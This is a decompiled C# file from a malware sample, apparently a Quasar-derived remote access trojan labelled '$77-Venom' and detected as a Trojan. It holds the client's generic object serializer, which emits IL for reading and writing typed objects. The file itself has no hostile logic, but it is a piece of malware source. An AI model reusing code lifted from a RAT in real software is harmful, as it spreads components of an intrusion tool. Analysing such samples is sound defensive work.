// Decompiled with JetBrains decompiler
// Type: xClient.Core.NetSerializer.TypeSerializers.ObjectSerializer
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Zapchast.gen-815b2bf1ddadfb46a27001e08246e8f82f629eb793963bef856d17e1ef9c4085.exe

using System;
using System.Collections.Generic;
using System.Reflection;
using System.Reflection.Emit;

namespace xClient.Core.NetSerializer.TypeSerializers
{
  internal class ObjectSerializer : IDynamicTypeSerializer, ITypeSerializer
  {
    public bool Handles(Type type) => type == typeof (object);

    public IEnumerable<Type> GetSubtypes(Type type) => (IEnumerable<Type>) new Type[0];

    public void GenerateWriterMethod(Type obtype, CodeGenContext ctx, ILGenerator il)
    {
      MethodInfo method = typeof (Serializer).GetMethod("GetTypeID", BindingFlags.Instance | BindingFlags.NonPublic, (Binder) null, new Type[1]
      {
        typeof (object)
      }, (ParameterModifier[]) null);
      IDictionary<Type, TypeData> typeMap = ctx.TypeMap;
      LocalBuilder local = il.DeclareLocal(typeof (ushort));
      il.Emit(OpCodes.Ldarg_0);
      il.Emit(OpCodes.Ldarg_2);
      il.Emit(OpCodes.Call, method);
      il.Emit(OpCodes.Stloc_S, local);
      il.Emit(OpCodes.Ldarg_1);
      il.Emit(OpCodes.Ldloc_S, local);
      il.Emit(OpCodes.Call, ctx.GetWriterMethodInfo(typeof (ushort)));
      Label[] labels = new Label[typeMap.Count + 1];
      labels[0] = il.DefineLabel();
      foreach (KeyValuePair<Type, TypeData> keyValuePair in (IEnumerable<KeyValuePair<Type, TypeData>>) typeMap)
        labels[(int) keyValuePair.Value.TypeID] = il.DefineLabel();
      il.Emit(OpCodes.Ldloc_S, local);
      il.Emit(OpCodes.Switch, labels);
      il.Emit(OpCodes.Newobj, Helpers.ExceptionCtorInfo);
      il.Emit(OpCodes.Throw);
      il.MarkLabel(labels[0]);
      il.Emit(OpCodes.Ret);
      foreach (KeyValuePair<Type, TypeData> keyValuePair in (IEnumerable<KeyValuePair<Type, TypeData>>) typeMap)
      {
        Type key = keyValuePair.Key;
        TypeData typeData = keyValuePair.Value;
        il.MarkLabel(labels[(int) typeData.TypeID]);
        if (typeData.NeedsInstanceParameter)
          il.Emit(OpCodes.Ldarg_0);
        il.Emit(OpCodes.Ldarg_1);
        il.Emit(OpCodes.Ldarg_2);
        il.Emit(key.IsValueType ? OpCodes.Unbox_Any : OpCodes.Castclass, key);
        il.Emit(OpCodes.Tailcall);
        il.Emit(OpCodes.Call, typeData.WriterMethodInfo);
        il.Emit(OpCodes.Ret);
      }
    }

    public void GenerateReaderMethod(Type obtype, CodeGenContext ctx, ILGenerator il)
    {
      IDictionary<Type, TypeData> typeMap = ctx.TypeMap;
      LocalBuilder local1 = il.DeclareLocal(typeof (ushort));
      il.Emit(OpCodes.Ldarg_1);
      il.Emit(OpCodes.Ldloca_S, local1);
      il.Emit(OpCodes.Call, ctx.GetReaderMethodInfo(typeof (ushort)));
      Label[] labels = new Label[typeMap.Count + 1];
      labels[0] = il.DefineLabel();
      foreach (KeyValuePair<Type, TypeData> keyValuePair in (IEnumerable<KeyValuePair<Type, TypeData>>) typeMap)
        labels[(int) keyValuePair.Value.TypeID] = il.DefineLabel();
      il.Emit(OpCodes.Ldloc_S, local1);
      il.Emit(OpCodes.Switch, labels);
      il.Emit(OpCodes.Newobj, Helpers.ExceptionCtorInfo);
      il.Emit(OpCodes.Throw);
      il.MarkLabel(labels[0]);
      il.Emit(OpCodes.Ldarg_2);
      il.Emit(OpCodes.Ldnull);
      il.Emit(OpCodes.Stind_Ref);
      il.Emit(OpCodes.Ret);
      foreach (KeyValuePair<Type, TypeData> keyValuePair in (IEnumerable<KeyValuePair<Type, TypeData>>) typeMap)
      {
        Type key = keyValuePair.Key;
        TypeData typeData = keyValuePair.Value;
        il.MarkLabel(labels[(int) typeData.TypeID]);
        LocalBuilder local2 = il.DeclareLocal(key);
        if (typeData.NeedsInstanceParameter)
          il.Emit(OpCodes.Ldarg_0);
        il.Emit(OpCodes.Ldarg_1);
        if (local2.LocalIndex < 256)
          il.Emit(OpCodes.Ldloca_S, local2);
        else
          il.Emit(OpCodes.Ldloca, local2);
        il.Emit(OpCodes.Call, typeData.ReaderMethodInfo);
        il.Emit(OpCodes.Ldarg_2);
        if (local2.LocalIndex < 256)
          il.Emit(OpCodes.Ldloc_S, local2);
        else
          il.Emit(OpCodes.Ldloc, local2);
        if (key.IsValueType)
          il.Emit(OpCodes.Box, key);
        il.Emit(OpCodes.Stind_Ref);
        il.Emit(OpCodes.Ret);
      }
    }
  }
}
